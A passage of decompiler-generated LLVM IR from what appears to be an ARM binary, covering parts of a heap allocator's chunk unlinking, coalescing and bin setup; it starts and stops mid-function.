dec_label_pc_1275c:                               ; preds = %dec_label_pc_12740
  %v1_1275c = inttoptr i32 %v0_1275c to i32*
  %v2_1275c = load i32, i32* %v1_1275c, align 4
  store i32 %v2_1275c, i32* %r5.global-to-local, align 4
  %v2_12760 = sub i32 %v0_1275c, %v2_1275c
  store i32 %v2_12760, i32* %r3.global-to-local, align 4
  %v1_12764 = add i32 %v2_12760, 8
  %v2_12764 = inttoptr i32 %v1_12764 to i32*
  %v3_12764 = load i32, i32* %v2_12764, align 4
  store i32 %v3_12764, i32* @ip, align 4
  %v1_12768 = add i32 %v3_12764, 12
  %v2_12768 = inttoptr i32 %v1_12768 to i32*
  %v3_12768 = load i32, i32* %v2_12768, align 4
  store i32 %v3_12768, i32* %r1.global-to-local, align 4
  %v9_1276c = icmp eq i32 %v3_12768, %v2_12760
  %v1_12770 = add i32 %v2_12760, 12
  %v2_12770 = inttoptr i32 %v1_12770 to i32*
  %v3_12770 = load i32, i32* %v2_12770, align 4
  store i32 %v3_12770, i32* %r2.global-to-local, align 4
  br i1 %v9_1276c, label %dec_label_pc_12778, label %dec_label_pc_127d4

dec_label_pc_12778:                               ; preds = %dec_label_pc_1275c
  %v1_12778 = add i32 %v3_12770, 8
  %v2_12778 = inttoptr i32 %v1_12778 to i32*
  %v3_12778 = load i32, i32* %v2_12778, align 4
  store i32 %v3_12778, i32* %r3.global-to-local, align 4
  %v9_1277c = icmp eq i32 %v3_12778, %v2_12760
  br i1 %v9_1277c, label %dec_label_pc_12784, label %dec_label_pc_127d4

dec_label_pc_12784:                               ; preds = %dec_label_pc_12778
  store i32 %v3_12764, i32* %v2_12778, align 4
  %v0_12788 = load i32, i32* %r2.global-to-local, align 4
  %v1_12788 = load i32, i32* @ip, align 4
  %v2_12788 = add i32 %v1_12788, 12
  %v3_12788 = inttoptr i32 %v2_12788 to i32*
  store i32 %v0_12788, i32* %v3_12788, align 4
  %v0_1278c = load i32, i32* %lr.global-to-local, align 4
  %v1_1278c = load i32, i32* %r5.global-to-local, align 4
  %v2_1278c = add i32 %v1_1278c, %v0_1278c
  store i32 %v2_1278c, i32* %lr.global-to-local, align 4
  %v0_12794.pre = load i32, i32* @r0, align 4
  %v0_12798.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12790

dec_label_pc_12790:                               ; preds = %dec_label_pc_12740, %dec_label_pc_12784
  %v0_12808 = phi i32 [ %v1_12744, %dec_label_pc_12740 ], [ %v2_1278c, %dec_label_pc_12784 ]
  %v0_12798 = phi i32 [ %v3_12754, %dec_label_pc_12740 ], [ %v0_12798.pre, %dec_label_pc_12784 ]
  %v1_127ac = phi i32 [ %v2_12748, %dec_label_pc_12740 ], [ %v0_12794.pre, %dec_label_pc_12784 ]
  %v0_12790 = load i32, i32* @r4, align 4
  %v1_12790 = add i32 %v0_12790, 44
  %v2_12790 = inttoptr i32 %v1_12790 to i32*
  %v3_12790 = load i32, i32* %v2_12790, align 4
  store i32 %v3_12790, i32* %r3.global-to-local, align 4
  %v9_12794 = icmp eq i32 %v1_127ac, %v3_12790
  %v1_12798 = and i32 %v0_12798, -4
  store i32 %v1_12798, i32* %r5.global-to-local, align 4
  br i1 %v9_12794, label %dec_label_pc_12808, label %dec_label_pc_127a0

dec_label_pc_127a0:                               ; preds = %dec_label_pc_12790
  %v2_127a0 = add i32 %v1_127ac, %v1_12798
  store i32 %v2_127a0, i32* %r3.global-to-local, align 4
  %v1_127a4 = add i32 %v2_127a0, 4
  %v2_127a4 = inttoptr i32 %v1_127a4 to i32*
  %v3_127a4 = load i32, i32* %v2_127a4, align 4
  store i32 %v3_127a4, i32* %r3.global-to-local, align 4
  %v1_127a8 = urem i32 %v3_127a4, 2
  %v2_127a8 = icmp eq i32 %v1_127a8, 0
  %v2_127ac = add i32 %v1_127ac, 4
  %v3_127ac = inttoptr i32 %v2_127ac to i32*
  store i32 %v1_12798, i32* %v3_127ac, align 4
  br i1 %v2_127a8, label %dec_label_pc_127b4, label %dec_label_pc_127a0.dec_label_pc_127e4_crit_edge

dec_label_pc_127a0.dec_label_pc_127e4_crit_edge:  ; preds = %dec_label_pc_127a0
  %v0_127e8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_127e4

dec_label_pc_127b4:                               ; preds = %dec_label_pc_127a0
  %v0_127b4 = load i32, i32* @r0, align 4
  %v1_127b4 = add i32 %v0_127b4, 8
  %v2_127b4 = inttoptr i32 %v1_127b4 to i32*
  %v3_127b4 = load i32, i32* %v2_127b4, align 4
  store i32 %v3_127b4, i32* @ip, align 4
  %v1_127b8 = add i32 %v3_127b4, 12
  %v2_127b8 = inttoptr i32 %v1_127b8 to i32*
  %v3_127b8 = load i32, i32* %v2_127b8, align 4
  store i32 %v3_127b8, i32* %r3.global-to-local, align 4
  %v9_127bc = icmp eq i32 %v3_127b8, %v0_127b4
  %v1_127c0 = add i32 %v0_127b4, 12
  %v2_127c0 = inttoptr i32 %v1_127c0 to i32*
  %v3_127c0 = load i32, i32* %v2_127c0, align 4
  store i32 %v3_127c0, i32* %r2.global-to-local, align 4
  br i1 %v9_127bc, label %dec_label_pc_127c8, label %dec_label_pc_127d4

dec_label_pc_127c8:                               ; preds = %dec_label_pc_127b4
  %v1_127c8 = add i32 %v3_127c0, 8
  %v2_127c8 = inttoptr i32 %v1_127c8 to i32*
  %v3_127c8 = load i32, i32* %v2_127c8, align 4
  store i32 %v3_127c8, i32* %r3.global-to-local, align 4
  %v9_127cc = icmp eq i32 %v3_127c8, %v0_127b4
  br i1 %v9_127cc, label %dec_label_pc_127d8, label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_127b4, %dec_label_pc_12778, %dec_label_pc_1275c, %dec_label_pc_127c8
  %v0_127d4 = call i32 @function_12b24()
  store i32 %v0_127d4, i32* @r0, align 4
  %v0_127d8.pre = load i32, i32* @ip, align 4
  %v1_127d8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127c8, %dec_label_pc_127d4
  %v1_127d8 = phi i32 [ %v3_127c0, %dec_label_pc_127c8 ], [ %v1_127d8.pre, %dec_label_pc_127d4 ]
  %v0_127d8 = phi i32 [ %v3_127b4, %dec_label_pc_127c8 ], [ %v0_127d8.pre, %dec_label_pc_127d4 ]
  %v2_127d8 = add i32 %v1_127d8, 8
  %v3_127d8 = inttoptr i32 %v2_127d8 to i32*
  store i32 %v0_127d8, i32* %v3_127d8, align 4
  %v0_127dc = load i32, i32* %r2.global-to-local, align 4
  %v1_127dc = load i32, i32* @ip, align 4
  %v2_127dc = add i32 %v1_127dc, 12
  %v3_127dc = inttoptr i32 %v2_127dc to i32*
  store i32 %v0_127dc, i32* %v3_127dc, align 4
  %v0_127e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_127e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_127e0 = add i32 %v1_127e0, %v0_127e0
  store i32 %v2_127e0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_127e4

dec_label_pc_127e4:                               ; preds = %dec_label_pc_127a0.dec_label_pc_127e4_crit_edge, %dec_label_pc_127d8
  %v0_127e8 = phi i32 [ %v0_127e8.pre, %dec_label_pc_127a0.dec_label_pc_127e4_crit_edge ], [ %v2_127e0, %dec_label_pc_127d8 ]
  %v0_127e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_127e4 = add i32 %v0_127e4, 8
  %v2_127e4 = inttoptr i32 %v1_127e4 to i32*
  %v3_127e4 = load i32, i32* %v2_127e4, align 4
  store i32 %v3_127e4, i32* %r2.global-to-local, align 4
  %v1_127e8 = or i32 %v0_127e8, 1
  store i32 %v1_127e8, i32* %r3.global-to-local, align 4
  %v0_127ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_127ec, i32* %v2_127e4, align 4
  %v0_127f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_127f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_127f0 = add i32 %v1_127f0, 12
  %v3_127f0 = inttoptr i32 %v2_127f0 to i32*
  store i32 %v0_127f0, i32* %v3_127f0, align 4
  %v0_127f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_127f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_127f4 = add i32 %v1_127f4, %v0_127f4
  %v4_127f4 = inttoptr i32 %v3_127f4 to i32*
  store i32 %v0_127f4, i32* %v4_127f4, align 4
  %v0_127f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_127f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_127f8 = add i32 %v1_127f8, 4
  %v3_127f8 = inttoptr i32 %v2_127f8 to i32*
  store i32 %v0_127f8, i32* %v3_127f8, align 4
  %v0_127fc = load i32, i32* %r2.global-to-local, align 4
  %v1_127fc = load i32, i32* %r1.global-to-local, align 4
  %v2_127fc = add i32 %v1_127fc, 8
  %v3_127fc = inttoptr i32 %v2_127fc to i32*
  store i32 %v0_127fc, i32* %v3_127fc, align 4
  %v0_12800 = load i32, i32* %r7.global-to-local, align 4
  %v1_12800 = load i32, i32* %r1.global-to-local, align 4
  %v2_12800 = add i32 %v1_12800, 12
  %v3_12800 = inttoptr i32 %v2_12800 to i32*
  store i32 %v0_12800, i32* %v3_12800, align 4
  br label %dec_label_pc_12818

dec_label_pc_12808:                               ; preds = %dec_label_pc_12790
  %v2_12808 = add i32 %v1_12798, %v0_12808
  %v1_1280c = or i32 %v2_12808, 1
  store i32 %v1_1280c, i32* %r3.global-to-local, align 4
  %v1_12810 = load i32, i32* %r1.global-to-local, align 4
  %v2_12810 = add i32 %v1_12810, 4
  %v3_12810 = inttoptr i32 %v2_12810 to i32*
  store i32 %v1_1280c, i32* %v3_12810, align 4
  %v0_12814 = load i32, i32* %r1.global-to-local, align 4
  %v1_12814 = load i32, i32* @r4, align 4
  %v2_12814 = add i32 %v1_12814, 44
  %v3_12814 = inttoptr i32 %v2_12814 to i32*
  store i32 %v0_12814, i32* %v3_12814, align 4
  br label %dec_label_pc_12818

dec_label_pc_12818:                               ; preds = %dec_label_pc_127e4, %dec_label_pc_12808
  %v0_12818 = load i32, i32* %sl.global-to-local, align 4
  %v2_12818 = icmp eq i32 %v0_12818, 0
  store i32 %v0_12818, i32* %r1.global-to-local, align 4
  br i1 %v2_12818, label %dec_label_pc_12824.loopexit, label %dec_label_pc_12740

dec_label_pc_12824.loopexit:                      ; preds = %dec_label_pc_12818
  %v0_12824.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_12824.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %dec_label_pc_12824.loopexit, %dec_label_pc_12730
  %v1_12824 = phi i32 [ %v1_12824.pre, %dec_label_pc_12824.loopexit ], [ %v1_1282410, %dec_label_pc_12730 ]
  %v0_1282c = phi i32 [ %v0_12824.pre, %dec_label_pc_12824.loopexit ], [ %v1_1273c, %dec_label_pc_12730 ]
  %v9_12824 = icmp eq i32 %v0_1282c, %v1_12824
  br i1 %v9_12824, label %dec_label_pc_1289c, label %dec_label_pc_1282c

dec_label_pc_1282c:                               ; preds = %dec_label_pc_12824
  %v1_1282c = add i32 %v0_1282c, 4
  store i32 %v1_1282c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12730

dec_label_pc_12834.dec_label_pc_12834_crit_edge:  ; preds = %dec_label_pc_12834.preheader, %dec_label_pc_12834.dec_label_pc_12834_crit_edge
  %v0_12834.pre = load i32, i32* @r4, align 4
  %v1_12834.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12834 = mul i32 %v1_12834.pre, 8
  %v5_12834 = add i32 %v4_12834, %v0_12834.pre
  %v1_12838 = add i32 %v1_12834.pre, 1
  store i32 %v1_12838, i32* %r2.global-to-local, align 4
  %v1_1283c = add i32 %v5_12834, 44
  store i32 %v1_1283c, i32* %r3.global-to-local, align 4
  %v2_12844 = add i32 %v5_12834, 52
  %v3_12844 = inttoptr i32 %v2_12844 to i32*
  store i32 %v1_1283c, i32* %v3_12844, align 4
  %v0_12848 = load i32, i32* %r3.global-to-local, align 4
  %v2_12848 = add i32 %v0_12848, 12
  %v3_12848 = inttoptr i32 %v2_12848 to i32*
  store i32 %v0_12848, i32* %v3_12848, align 4
  %v7_1284c = icmp sgt i32 %v1_12838, 95
  br i1 %v7_1284c, label %dec_label_pc_12850, label %dec_label_pc_12834.dec_label_pc_12834_crit_edge

dec_label_pc_12850:                               ; preds = %dec_label_pc_12834.dec_label_pc_12834_crit_edge
  %v0_12850 = load i32, i32* @r4, align 4
  %v1_12850 = inttoptr i32 %v0_12850 to i32*
  %v2_12850 = load i32, i32* %v1_12850, align 4
  store i32 %v2_12850, i32* %r2.global-to-local, align 4
  %v1_12854 = add i32 %v0_12850, 864
  %v2_12854 = inttoptr i32 %v1_12854 to i32*
  %v3_12854 = load i32, i32* %v2_12854, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1285c = urem i32 %v2_12850, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12864 = or i32 %v3_12854, 1
  store i32 %v1_12864, i32* %r1.global-to-local, align 4
  %v1_12868 = or i32 %v1_1285c, 72
  store i32 %v1_12868, i32* %r2.global-to-local, align 4
  %v1_1286c = add i32 %v0_12850, 52
  store i32 %v1_1286c, i32* @ip, align 4
  %v2_12870 = add i32 %v0_12850, 840
  %v3_12870 = inttoptr i32 %v2_12870 to i32*
  store i32 0, i32* %v3_12870, align 4
  %v0_12874 = load i32, i32* %r3.global-to-local, align 4
  %v1_12874 = add i32 %v0_12874, 65536
  store i32 %v1_12874, i32* %r3.global-to-local, align 4
  %v0_12878 = load i32, i32* %r0.global-to-local, align 4
  %v1_12878 = load i32, i32* @r4, align 4
  %v2_12878 = add i32 %v1_12878, 836
  %v3_12878 = inttoptr i32 %v2_12878 to i32*
  store i32 %v0_12878, i32* %v3_12878, align 4
  %v0_1287c = load i32, i32* %r0.global-to-local, align 4
  %v1_1287c = load i32, i32* @r4, align 4
  %v2_1287c = add i32 %v1_1287c, 844
  %v3_1287c = inttoptr i32 %v2_1287c to i32*
  store i32 %v0_1287c, i32* %v3_1287c, align 4
  %v1_12880 = load i32, i32* @r4, align 4
  %v2_12880 = add i32 %v1_12880, 852
  %v3_12880 = inttoptr i32 %v2_12880 to i32*
  store i32 %v1_12874, i32* %v3_12880, align 4
  %v1_12884 = load i32, i32* @r4, align 4
  %v2_12884 = add i32 %v1_12884, 864
  %v3_12884 = inttoptr i32 %v2_12884 to i32*
  store i32 %v1_12864, i32* %v3_12884, align 4
  %v1_12888 = load i32, i32* @r4, align 4
  %v2_12888 = inttoptr i32 %v1_12888 to i32*
  store i32 %v1_12868, i32* %v2_12888, align 4
  %v0_1288c = load i32, i32* @ip, align 4
  %v1_1288c = load i32, i32* @r4, align 4
  %v2_1288c = add i32 %v1_1288c, 44
  %v3_1288c = inttoptr i32 %v2_1288c to i32*
  store i32 %v0_1288c, i32* %v3_1288c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12894 = call i32 @function_130f8(i32 30, i32 %v1_12864, i32 %v1_12868, i32 %v1_12874)
  store i32 %v4_12894, i32* @r0, align 4
  %v1_12898 = load i32, i32* @r4, align 4
  %v2_12898 = add i32 %v1_12898, 860
  %v3_12898 = inttoptr i32 %v2_12898 to i32*
  store i32 %v4_12894, i32* %v3_12898, align 4
  br label %dec_label_pc_1289c

dec_label_pc_1289c:                               ; preds = %dec_label_pc_12824, %dec_label_pc_12850
  %v2_128a0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_128a0, i32* @r4, align 4
  %v1_128a4 = load i32, i32* @r0, align 4
  ret i32 %v1_128a4

; uselistorder directives
  uselistorder i32 %v0_12850, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12848, { 1, 0 }
  uselistorder i32 %v1_1282c, { 1, 0 }
  uselistorder i32 %v0_12818, { 0, 2, 1 }
  uselistorder i32 %v0_127f4, { 1, 0 }
  uselistorder i32 %v1_12744, { 1, 0, 2 }
  uselistorder i32 %v0_1275c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1271c, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 5, 6, 3, 1, 0, 2, 4 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 17, 2, 10, 6, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 8, 9, 7 }
  uselistorder label %dec_label_pc_1289c, { 1, 0 }
  uselistorder label %dec_label_pc_12834.dec_label_pc_12834_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12818, { 1, 0 }
  uselistorder label %dec_label_pc_127e4, { 1, 0 }
  uselistorder label %dec_label_pc_127d8, { 1, 0 }
  uselistorder label %dec_label_pc_127d4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12790, { 1, 0 }
}

define i32 @function_128a8() local_unnamed_addr {
dec_label_pc_128a8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_128a8 = load i32, i32* @r4, align 4
  %v6_128a8 = load i32, i32* @r5, align 4
  %v9_128a8 = load i32, i32* @r6, align 4
  %v12_128a8 = load i32, i32* @r7, align 4
  %v18_128a8 = load i32, i32* @lr, align 4
  %v0_128b0 = load i32, i32* @r0, align 4
  store i32 %v0_128b0, i32* @r6, align 4
  %v2_128b0 = icmp eq i32 %v0_128b0, 0
  %v2_128b4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 124820, i32* @r7, align 4
  br i1 %v2_128b0, label %dec_label_pc_12abc, label %dec_label_pc_128c0

dec_label_pc_128c0:                               ; preds = %dec_label_pc_128a8
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_128c4 = load i32, i32* inttoptr (i32 124888 to i32*), align 8
  store i32 %v4_128c4, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_128c4, i32* %r2.global-to-local, align 4
  %v4_128d0 = load i32, i32* inttoptr (i32 124856 to i32*), align 8
  store i32 %v4_128d0, i32* %r1.global-to-local, align 4
  store i32 %v2_128b4, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_128dc = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  store i32 %v4_128dc, i32* %ip.global-to-local, align 4
  store i32 76008, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_128dc)
  %v0_128e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_128e8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_128f0 = load i32, i32* @r7, align 4
  %v2_128f0 = add i32 %v0_128f0, 16
  %v3_128f0 = inttoptr i32 %v2_128f0 to i32*
  %v4_128f0 = load i32, i32* %v3_128f0, align 4
  store i32 %v4_128f0, i32* %ip.global-to-local, align 4
  store i32 76028, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_128f0)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12900 = load i32, i32* @r7, align 4
  %v2_12900 = add i32 %v0_12900, 32
  %v3_12900 = inttoptr i32 %v2_12900 to i32*
  %v4_12900 = load i32, i32* %v3_12900, align 4
  store i32 %v4_12900, i32* @lr, align 4
  %v0_12904 = load i32, i32* @r6, align 4
  %v1_12904 = add i32 %v0_12904, -4
  %v2_12904 = inttoptr i32 %v1_12904 to i32*
  %v3_12904 = load i32, i32* %v2_12904, align 4
  store i32 %v3_12904, i32* %r2.global-to-local, align 4
  %v1_12908 = inttoptr i32 %v4_12900 to i32*
  %v2_12908 = load i32, i32* %v1_12908, align 4
  store i32 %v2_12908, i32* %r3.global-to-local, align 4
  %v1_1290c = and i32 %v3_12904, -4
  store i32 %v1_1290c, i32* %ip.global-to-local, align 4
  %v1_12910 = add i32 %v0_12904, -8
  store i32 %v1_12910, i32* @r5, align 4
  store i32 %v1_12910, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1290c, %v2_12908
  br i1 %tmp, label %dec_label_pc_12940, label %dec_label_pc_12920

dec_label_pc_12920:                               ; preds = %dec_label_pc_128c0
  %v1_12920 = or i32 %v2_12908, 3
  store i32 %v1_12920, i32* %r3.global-to-local, align 4
  store i32 %v1_12920, i32* %v1_12908, align 4
  %v3_12924 = load i32, i32* @lr, align 4
  %v4_12924 = add i32 %v3_12924, -8
  store i32 %v4_12924, i32* %lr.global-to-local, align 4
  %v0_12928 = load i32, i32* %ip.global-to-local, align 4
  %v3_12928 = udiv i32 %v0_12928, 8
  store i32 %v3_12928, i32* %r1.global-to-local, align 4
  %v1_1292c = add i32 %v3_12924, -4
  store i32 %v1_1292c, i32* %r2.global-to-local, align 4
  %v4_12930 = mul nuw i32 %v3_12928, 4
  %v5_12930 = add i32 %v4_12930, %v1_1292c
  %v6_12930 = inttoptr i32 %v5_12930 to i32*
  %v7_12930 = load i32, i32* %v6_12930, align 4
  store i32 %v7_12930, i32* %r3.global-to-local, align 4
  %v1_12934 = load i32, i32* @r5, align 4
  %v2_12934 = add i32 %v1_12934, 8
  %v3_12934 = inttoptr i32 %v2_12934 to i32*
  store i32 %v7_12930, i32* %v3_12934, align 4
  %v0_12938 = load i32, i32* @r5, align 4
  %v1_12938 = load i32, i32* %r2.global-to-local, align 4
  %v2_12938 = load i32, i32* %r1.global-to-local, align 4
  %v5_12938 = mul i32 %v2_12938, 4
  %v6_12938 = add i32 %v5_12938, %v1_12938
  %v7_12938 = inttoptr i32 %v6_12938 to i32*
  store i32 %v0_12938, i32* %v7_12938, align 4
  br label %dec_label_pc_12aa4

dec_label_pc_12940:                               ; preds = %dec_label_pc_128c0
  %v1_12940 = and i32 %v3_12904, 2
  %v2_12940 = icmp eq i32 %v1_12940, 0
  br i1 %v2_12940, label %dec_label_pc_12948, label %dec_label_pc_12a7c

dec_label_pc_12948:                               ; preds = %dec_label_pc_12940
  %v1_12948 = or i32 %v2_12908, 1
  store i32 %v1_12948, i32* %r3.global-to-local, align 4
  store i32 %v1_12948, i32* %v1_12908, align 4
  %v0_12950 = load i32, i32* @r6, align 4
  %v1_12950 = add i32 %v0_12950, -4
  %v2_12950 = inttoptr i32 %v1_12950 to i32*
  %v3_12950 = load i32, i32* %v2_12950, align 4
  store i32 %v3_12950, i32* %r3.global-to-local, align 4
  %v0_12954 = load i32, i32* @r5, align 4
  %v1_12954 = load i32, i32* %ip.global-to-local, align 4
  %v2_12954 = add i32 %v1_12954, %v0_12954
  store i32 %v2_12954, i32* %lr.global-to-local, align 4
  %v1_12958 = urem i32 %v3_12950, 2
  %v2_12958 = icmp eq i32 %v1_12958, 0
  %v1_1295c = add i32 %v2_12954, 4
  %v2_1295c = inttoptr i32 %v1_1295c to i32*
  %v3_1295c = load i32, i32* %v2_1295c, align 4
  store i32 %v3_1295c, i32* %r8.global-to-local, align 4
  br i1 %v2_12958, label %dec_label_pc_12964, label %dec_label_pc_12998

dec_label_pc_12964:                               ; preds = %dec_label_pc_12948
  %v1_12964 = add i32 %v0_12950, -8
  %v2_12964 = inttoptr i32 %v1_12964 to i32*
  %v3_12964 = load i32, i32* %v2_12964, align 4
  store i32 %v3_12964, i32* %r1.global-to-local, align 4
  %v2_12968 = sub i32 %v0_12954, %v3_12964
  store i32 %v2_12968, i32* %r3.global-to-local, align 4
  %v1_1296c = add i32 %v2_12968, 8
  %v2_1296c = inttoptr i32 %v1_1296c to i32*
  %v3_1296c = load i32, i32* %v2_1296c, align 4
  store i32 %v3_1296c, i32* %r2.global-to-local, align 4
  %v1_12970 = add i32 %v3_1296c, 12
  %v2_12970 = inttoptr i32 %v1_12970 to i32*
  %v3_12970 = load i32, i32* %v2_12970, align 4
  store i32 %v3_12970, i32* %r4.global-to-local, align 4
  %v9_12974 = icmp eq i32 %v3_12970, %v2_12968
  %v1_12978 = add i32 %v2_12968, 12
  %v2_12978 = inttoptr i32 %v1_12978 to i32*
  %v3_12978 = load i32, i32* %v2_12978, align 4
  store i32 %v3_12978, i32* %r0.global-to-local, align 4
  br i1 %v9_12974, label %dec_label_pc_12980, label %dec_label_pc_129e4

dec_label_pc_12980:                               ; preds = %dec_label_pc_12964
  %v1_12980 = add i32 %v3_12978, 8
  %v2_12980 = inttoptr i32 %v1_12980 to i32*
  %v3_12980 = load i32, i32* %v2_12980, align 4
  store i32 %v3_12980, i32* %r3.global-to-local, align 4
  %v9_12984 = icmp eq i32 %v3_12980, %v2_12968
  br i1 %v9_12984, label %dec_label_pc_1298c, label %dec_label_pc_129e4

dec_label_pc_1298c:                               ; preds = %dec_label_pc_12980
  store i32 %v3_1296c, i32* %v2_12980, align 4
  %v0_12990 = load i32, i32* %r0.global-to-local, align 4
  %v1_12990 = load i32, i32* %r2.global-to-local, align 4
  %v2_12990 = add i32 %v1_12990, 12
  %v3_12990 = inttoptr i32 %v2_12990 to i32*
  store i32 %v0_12990, i32* %v3_12990, align 4
  %v0_12994 = load i32, i32* %ip.global-to-local, align 4
  %v1_12994 = load i32, i32* %r1.global-to-local, align 4
  %v2_12994 = add i32 %v1_12994, %v0_12994
  store i32 %v2_12994, i32* %ip.global-to-local, align 4
  %v0_129a4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_129a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %dec_label_pc_12948, %dec_label_pc_1298c
  %v0_12a24 = phi i32 [ %v1_12954, %dec_label_pc_12948 ], [ %v2_12994, %dec_label_pc_1298c ]
  %v0_129a8 = phi i32 [ %v3_1295c, %dec_label_pc_12948 ], [ %v0_129a8.pre, %dec_label_pc_1298c ]
  %v1_129bc = phi i32 [ %v2_12954, %dec_label_pc_12948 ], [ %v0_129a4.pre, %dec_label_pc_1298c ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1299c = load i32, i32* @r7, align 4
  %v2_1299c = add i32 %v0_1299c, 32
  %v3_1299c = inttoptr i32 %v2_1299c to i32*
  %v4_1299c = load i32, i32* %v3_1299c, align 4
  store i32 %v4_1299c, i32* %r2.global-to-local, align 4
  %v1_129a0 = add i32 %v4_1299c, 44
  %v2_129a0 = inttoptr i32 %v1_129a0 to i32*
  %v3_129a0 = load i32, i32* %v2_129a0, align 4
  store i32 %v3_129a0, i32* %r3.global-to-local, align 4
  %v9_129a4 = icmp eq i32 %v1_129bc, %v3_129a0
  %v1_129a8 = and i32 %v0_129a8, -4
  store i32 %v1_129a8, i32* %r0.global-to-local, align 4
  br i1 %v9_129a4, label %dec_label_pc_12a24, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_12998
  %v2_129b0 = add i32 %v1_129bc, %v1_129a8
  store i32 %v2_129b0, i32* %r3.global-to-local, align 4
  %v1_129b4 = add i32 %v2_129b0, 4
  %v2_129b4 = inttoptr i32 %v1_129b4 to i32*
  %v3_129b4 = load i32, i32* %v2_129b4, align 4
  store i32 %v3_129b4, i32* %r3.global-to-local, align 4
  %v1_129b8 = urem i32 %v3_129b4, 2
  %v2_129b8 = icmp eq i32 %v1_129b8, 0
  %v2_129bc = add i32 %v1_129bc, 4
  %v3_129bc = inttoptr i32 %v2_129bc to i32*
  store i32 %v1_129a8, i32* %v3_129bc, align 4
  br i1 %v2_129b8, label %dec_label_pc_129c4, label %dec_label_pc_129b0.dec_label_pc_129f4_crit_edge

dec_label_pc_129b0.dec_label_pc_129f4_crit_edge:  ; preds = %dec_label_pc_129b0
  %v0_12a04.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_129f4

dec_label_pc_129c4:                               ; preds = %dec_label_pc_129b0
  %v0_129c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_129c4 = add i32 %v0_129c4, 8
  %v2_129c4 = inttoptr i32 %v1_129c4 to i32*
  %v3_129c4 = load i32, i32* %v2_129c4, align 4
  store i32 %v3_129c4, i32* %r1.global-to-local, align 4
  %v1_129c8 = add i32 %v3_129c4, 12
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  %v3_129c8 = load i32, i32* %v2_129c8, align 4
  store i32 %v3_129c8, i32* %r3.global-to-local, align 4
  %v9_129cc = icmp eq i32 %v3_129c8, %v0_129c4
  %v1_129d0 = add i32 %v0_129c4, 12
  %v2_129d0 = inttoptr i32 %v1_129d0 to i32*
  %v3_129d0 = load i32, i32* %v2_129d0, align 4
  store i32 %v3_129d0, i32* %r2.global-to-local, align 4
  br i1 %v9_129cc, label %dec_label_pc_129d8, label %dec_label_pc_129e4

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129c4
  %v1_129d8 = add i32 %v3_129d0, 8
  %v2_129d8 = inttoptr i32 %v1_129d8 to i32*
  %v3_129d8 = load i32, i32* %v2_129d8, align 4
  store i32 %v3_129d8, i32* %r3.global-to-local, align 4
  %v9_129dc = icmp eq i32 %v3_129d8, %v0_129c4
